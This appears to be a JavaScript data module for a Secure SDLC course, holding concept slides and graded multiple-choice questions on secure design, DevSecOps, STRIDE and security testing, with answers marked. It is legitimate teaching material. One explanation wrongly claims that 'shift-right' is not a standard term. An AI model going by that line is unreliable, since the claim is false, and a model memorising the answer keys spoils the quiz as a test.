    title: "Secure SDLC",
    icon: "⚙️",
    desc: "SSDLC, secure by design, DevSecOps, threat modeling, testing & secure release",
    color: "#7b5cf5",
    levels: [
      {
        id: "8-1", title: "Why Security Afterthought Fails", slides: "2-16",
        concept: {
          title: "Why Security as an Afterthought Fails",
          body: [
            { type: "bullet", text: "Vulnerabilities begin EARLY — during design and requirements, not just in code." },
            { type: "bullet", text: "Fixing a vulnerability after release costs 10x-100x more than during design." },
            { type: "bullet", text: "Some design flaws cannot be patched at all — they require redesign." },
            { type: "empty" },
            { type: "section", text: "Secure by Design vs Secure by Patch" },
            { type: "bullet", text: "SECURE BY PATCH = add security after building. Reactive. Expensive. Incomplete." },
            { type: "bullet", text: "SECURE BY DESIGN = security is part of the foundation from the beginning." },
            { type: "bullet", text: "Includes: minimising attack surface, reducing trust assumptions, defense in depth, fail securely, least privilege." },
            { type: "empty" },
            { type: "section", text: "Shift-Left Security" },
            { type: "bullet", text: "Move security activities EARLIER in the development lifecycle." },
            { type: "bullet", text: "Embed security in requirements, architecture, and coding — not just testing." },
            { type: "bullet", text: "Architecture decisions are the hardest and most expensive to change later." },
          ]
        },
        questions: [
          {
            q: "A team discovers a critical vulnerability after their app has been in production for 6 months. Fixing it requires redesigning the authentication flow and retesting all integrations. What does this demonstrate?",
            opts: ["Security is always cheap to implement", "The cost of late vulnerability remediation is exponentially higher than fixing issues early", "Production vulnerabilities are always easy to patch", "Users don't care about security flaws"],
            correct: 1,
            hint: "'The Cost of Late Vulnerability Remediation.' Fixing after release costs 10x-100x more than during design.",
            wrongReasons: {
              0: "Late remediation costs are high, not cheap.",
              2: "Some design flaws cannot be patched; they require rework.",
              3: "Data breaches damage reputation and customer trust."
            }
          },
          {
            q: "An e-commerce app technically works correctly but accepts negative quantities in a cart, giving a user a refund instead of a charge. No code bug exists — the logic never considered this case. What type of flaw is this?",
            opts: ["A syntax error", "Business logic abuse", "A network protocol flaw", "A hardware failure"],
            correct: 1,
            hint: "'Business Logic Abuse.' The application works technically correctly but allows unintended use.",
            wrongReasons: {
              0: "Syntax errors prevent compilation. The code runs correctly.",
              2: "Network protocols are not involved in cart quantity validation.",
              3: "No hardware component failed."
            }
          },
          {
            q: "A development team builds an application first, then hires a security consultant two weeks before release. The consultant finds the authentication system needs MFA but adding it requires changing the entire user flow. What approach did the team use?",
            opts: ["Secure by design; should have used secure by patch", "Secure by patch; should have used secure by design", "DevSecOps; should have used waterfall", "Shift-right; should have used shift-left"],
            correct: 1,
            hint: "Secure by patch = add security after building. Secure by design = security is part of the foundation.",
            wrongReasons: {
              0: "Reversed. They patched security on at the end.",
              2: "They did not integrate security throughout. They tested at the end.",
              3: "'Shift-right' is not a standard term."
            }
          },
          {
            q: "Which of the following is a core principle of 'Secure by Design'?",
            opts: ["Add security only after user complaints", "Minimize attack surface, reduce trust assumptions, and implement defense in depth from the beginning", "Rely solely on external security audits", "Assume attackers cannot understand the system"],
            correct: 1,
            hint: "'What Secure by Design Really Means' includes minimising attack surface, reducing trust assumptions, and defense in depth.",
            wrongReasons: {
              0: "Adding security after complaints is reactive patching.",
              2: "External audits validate but do not replace built-in security design.",
              3: "'Security through obscurity' is not a principle of secure by design."
            }
          }
        ]
      },
      {
        id: "8-2", title: "SSDLC & DevSecOps", slides: "17-29",
        concept: {
          title: "SSDLC Fundamentals & DevSecOps",
          body: [
            { type: "bullet", text: "SSDLC = integrates security into EVERY phase: requirements, design, coding, testing, operations." },
            { type: "bullet", text: "Security is NOT a separate phase — it is woven throughout development." },
            { type: "empty" },
            { type: "section", text: "SSDLC Cycle" },
            { type: "bullet", text: "Plan & Requirements → Threat modeling and security requirements." },
            { type: "bullet", text: "Architecture & Design → Secure design patterns and trust boundaries." },
            { type: "bullet", text: "Implementation → Secure coding standards and code review." },
            { type: "bullet", text: "Verification → Security testing, pen testing, automated scanning." },
            { type: "bullet", text: "Release & Deploy → Hardening, secure configuration." },
            { type: "bullet", text: "Operations & Monitor → Logging, detection, incident response." },
            { type: "empty" },
            { type: "section", text: "DevSecOps" },
            { type: "bullet", text: "Security integrated into CI/CD delivery pipelines." },
            { type: "bullet", text: "SAST (Static) – analyzes source code without running." },
            { type: "bullet", text: "DAST (Dynamic) – tests running application from the outside." },
            { type: "bullet", text: "Dependency scanning, container image scanning." },
          ]
        },
        questions: [
          {
            q: "A team treats security as a single 'security phase' that happens after coding but before release. According to SSDLC principles, what is wrong with this?",
            opts: ["It is too thorough", "Security is not a separate phase — it must be integrated into every development activity", "It happens too early", "Security should only be handled by operations"],
            correct: 1,
            hint: "'Security Is Not a Separate Development Phase.' A single late phase cannot catch design-level vulnerabilities.",
            wrongReasons: {
              0: "A separate security phase is not thorough enough.",
              2: "A phase after coding is late, not early.",
              3: "Security is everyone's responsibility."
            }
          },
          {
            q: "A company configures its CI/CD pipeline to automatically run static code analysis on every commit, scan dependencies for known vulnerabilities, and block deployment if critical issues are found. What approach is this?",
            opts: ["Manual security auditing", "DevSecOps with security automation in the delivery pipeline", "Waterfall security gate", "Penetration testing"],
            correct: 1,
            hint: "'DevSecOps: Security Integrated into Delivery Pipelines.' SAST, DAST, dependency scanning in CI/CD.",
            wrongReasons: {
              0: "The process is automated, not manual.",
              2: "Waterfall has a single late gate; this is continuous and automated.",
              3: "Pen testing is a manual adversarial exercise, not automated pipeline scanning."
            }
          },
          {
            q: "In a traditional waterfall project, security testing at the end finds critical issues but the business deadline is in 3 days, so they ship anyway. What problem does this illustrate?",
            opts: ["Security testing is too effective", "Security testing at the end gets overridden by business pressure, and vulnerabilities persist", "Developers write perfect code", "Agile methods are too slow"],
            correct: 1,
            hint: "'Security testing at the end blocks releases or gets skipped.' Business pressure overrides security.",
            wrongReasons: {
              0: "The issue is not effectiveness but timing and business pressure.",
              2: "If code were perfect, security testing would find nothing.",
              3: "Agile is designed to be faster and more adaptive."
            }
          },
          {
            q: "In an Agile environment, how should threat modeling be adapted compared to a waterfall project?",
            opts: ["Threat modeling should only happen at the project start", "Threat modeling should happen per feature or sprint, continuously", "Threat modeling is unnecessary in Agile", "Threat modeling should be delayed until the final release"],
            correct: 1,
            hint: "In Agile, 'security tasks become user stories, threat modeling happens per feature, and security testing is continuous.'",
            wrongReasons: {
              0: "That is the waterfall approach.",
              2: "Threat modeling is always necessary.",
              3: "Delaying until final release is the old waterfall approach."
            }
          }
        ]
      },
      {
        id: "8-3", title: "Secure Architecture & Threat Modeling", slides: "30-41",
        concept: {
          title: "Secure Architecture & Threat Modeling",
          body: [
            { type: "section", text: "Secure Planning & Requirements" },
            { type: "bullet", text: "Security requirements are REAL requirements, not optional add-ons." },
            { type: "bullet", text: "Abuse cases = how an attacker could misuse a legitimate feature." },
            { type: "bullet", text: "Misuse cases = how a legitimate user could accidentally cause harm." },
            { type: "bullet", text: "Security acceptance criteria define when a feature is 'secure enough' to release." },
            { type: "empty" },
            { type: "section", text: "STRIDE Threat Model" },
            { type: "bullet", text: "S – Spoofing: impersonating users or systems." },
            { type: "bullet", text: "T – Tampering: unauthorised data modification." },
            { type: "bullet", text: "R – Repudiation: denying actions without proof." },
            { type: "bullet", text: "I – Information Disclosure: unauthorised data access." },
            { type: "bullet", text: "D – Denial of Service: disrupting availability." },
            { type: "bullet", text: "E – Elevation of Privilege: gaining higher permissions." },
            { type: "empty" },
            { type: "bullet", text: "Trust boundaries: mark where trust levels change. Data crossing must be validated." },
          ]
        },
        questions: [
          {
            q: "A team uses STRIDE during threat modeling. They identify that an attacker could modify a request parameter to change another user's account settings. Which STRIDE category does this represent?",
            opts: ["Spoofing", "Tampering", "Repudiation", "Information Disclosure"],
            correct: 1,
            hint: "Tampering = 'Unauthorised data modification.' Changing another user's settings = tampering.",
            wrongReasons: {
              0: "Spoofing = impersonation. The attacker is not pretending to be someone else.",
              2: "Repudiation = denying actions. No denial is described.",
              3: "Information Disclosure = unauthorised data access. The issue is modification, not access."
            }
          },
          {
            q: "A team draws lines on their system diagram marking where the public internet meets their load balancer, where the app server talks to the database, and where authentication happens. Why are these lines important?",
            opts: ["They are just decorative", "They represent trust boundaries where data must be validated and security controls enforced", "They show network speed limits", "They mark where backups should occur"],
            correct: 1,
            hint: "'Trust Boundaries Matter.' They identify where trust assumptions change and authentication boundaries exist.",
            wrongReasons: {
              0: "These are functional security design elements.",
              2: "Trust boundaries are about security levels, not bandwidth.",
              3: "Backups are important but unrelated to trust boundary marking."
            }
          },
          {
            q: "Which of the following is NOT one of the STRIDE threat categories?",
            opts: ["Tampering", "Elevation of Privilege", "Social Engineering", "Information Disclosure"],
            correct: 2,
            hint: "STRIDE = Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege.",
            wrongReasons: {
              0: "Tampering IS a STRIDE category.",
              1: "Elevation of Privilege IS a STRIDE category.",
              3: "Information Disclosure IS a STRIDE category."
            }
          },
          {
            q: "A team analyzes how an attacker could misuse the 'password reset' feature to determine which email addresses are registered, then use that list for targeted phishing. What is this analysis called?",
            opts: ["A misuse case", "An abuse case", "A functional test", "A user story"],
            correct: 1,
            hint: "Abuse case = how an attacker could misuse a legitimate feature for malicious purposes.",
            wrongReasons: {
              0: "Misuse cases involve legitimate users causing accidental harm.",
              2: "Functional tests verify intended behavior, not attacker misuse.",
              3: "A user story describes desired functionality, not attacker behavior."
            }
          },
          {
            q: "An architecture review identifies that the entire application uses a single database account with full administrator privileges for all operations. What secure architecture principle is being violated?",
            opts: ["Economy of mechanism", "Least privilege", "Fail securely", "Defense in depth"],
            correct: 1,
            hint: "Least privilege: 'grant only minimal necessary permissions.' One admin account for everything violates this.",
            wrongReasons: {
              0: "Economy of mechanism means keeping design simple. One admin account is simple but insecure.",
              2: "Fail securely means defaulting to safe states on errors.",
              3: "Defense in depth uses multiple layers. The issue is excessive permissions."
            }
          }
        ]
      },
      {
        id: "8-4", title: "Secure Coding & Testing", slides: "42-62",
        concept: {
          title: "Secure Implementation & Security Testing",
          body: [
            { type: "section", text: "Secure Coding" },
            { type: "bullet", text: "Use allowlists (permitted values) rather than blocklists (forbidden values)." },
            { type: "bullet", text: "Never hardcode passwords, API keys, or tokens in source code." },
            { type: "bullet", text: "Enforce authentication on every protected endpoint." },
            { type: "bullet", text: "Dependency security: scan third-party libraries for known vulnerabilities." },
            { type: "empty" },
            { type: "section", text: "Security Testing" },
            { type: "bullet", text: "SAST – analyzes source code without running the application." },
            { type: "bullet", text: "DAST – tests running application from outside (like an attacker)." },
            { type: "bullet", text: "Fuzzing – sending random/malformed input to find crashes." },
            { type: "bullet", text: "Manual testing – catches logic flaws that tools miss." },
            { type: "bullet", text: "Penetration testing – ethical hackers simulate real adversaries." },
            { type: "bullet", text: "Security testing ≠ functional testing: asks 'Can it do what it should NOT?'" },
          ]
        },
        questions: [
          {
            q: "A developer writes code that handles file uploads. They check that the file extension is not '.exe.' An attacker uploads 'malicious.php.jpg' which bypasses the check and executes as PHP. What validation approach should have been used?",
            opts: ["Blocklist of forbidden extensions", "Allowlist of permitted extensions and server-side content validation", "Client-side JavaScript validation only", "Trust the filename from the user"],
            correct: 1,
            hint: "Use allowlists (permitted values) rather than blocklists (forbidden values). Blocklists can be bypassed.",
            wrongReasons: {
              0: "Blocklists can be bypassed with tricks like double extensions.",
              2: "Client-side validation can be bypassed entirely.",
              3: "User-submitted filenames should never be trusted."
            }
          },
          {
            q: "An application's source code contains a hardcoded database password pushed to a public GitHub repository. An attacker finds it and accesses production. What principle was violated?",
            opts: ["Defense in depth", "Secrets & sensitive data handling", "Fail securely", "Input validation"],
            correct: 1,
            hint: "'Never hardcode passwords, API keys, or tokens.' Use secret management systems.",
            wrongReasons: {
              0: "Defense in depth uses multiple layers. The issue is specifically secret exposure.",
              2: "Fail securely means safe defaults on errors, not secret management.",
              3: "Input validation is about user data, not developer secrets."
            }
          },
          {
            q: "A QA team verifies that a login form accepts valid credentials, rejects empty fields, and shows appropriate errors. They declare the feature 'fully tested.' What is missing from a security perspective?",
            opts: ["More functional test cases", "Security testing that asks whether the form can be abused — e.g., SQL injection, brute force, credential stuffing", "Better UI colors", "Faster page load times"],
            correct: 1,
            hint: "'Security Testing ≠ Functional Testing.' Security asks 'Can it be made to do what it should NOT?'",
            wrongReasons: {
              0: "The functional tests are complete. What's missing is security-focused testing.",
              2: "UI design is not a security testing concern.",
              3: "Performance is important but not the security gap."
            }
          },
          {
            q: "A security tool scans an application's source code without executing it, looking for hardcoded passwords, SQL query concatenation, and weak cryptography. What type of testing is this?",
            opts: ["DAST (Dynamic Application Security Testing)", "SAST (Static Application Security Testing)", "Penetration testing", "Fuzzing"],
            correct: 1,
            hint: "SAST = 'analyzes source code for vulnerabilities without running the application.'",
            wrongReasons: {
              0: "DAST tests running applications from the outside. This scans source code without execution.",
              2: "Penetration testing is manual adversarial testing of running systems.",
              3: "Fuzzing sends random input to running applications, not code pattern analysis."
            }
          },
          {
            q: "An automated scanner reports zero vulnerabilities. However, a penetration tester discovers that changing a numeric ID in a URL parameter lets them view other users' private records. Why did the scanner miss this?",
            opts: ["The scanner was broken", "Automated tools find known patterns but miss novel logic flaws and business logic vulnerabilities", "The vulnerability did not exist", "The scanner only tests network ports"],
            correct: 1,
            hint: "'Manual Security Testing Still Matters.' Automated tools 'find known patterns, not novel logic flaws.' IDOR requires human analysis.",
            wrongReasons: {
              0: "The scanner worked as designed — it just cannot detect logic flaws.",
              2: "The IDOR vulnerability definitely existed.",
              3: "Application security scanners test application logic, not just ports."
            }
          }
        ]
      }
    ]
  }
];
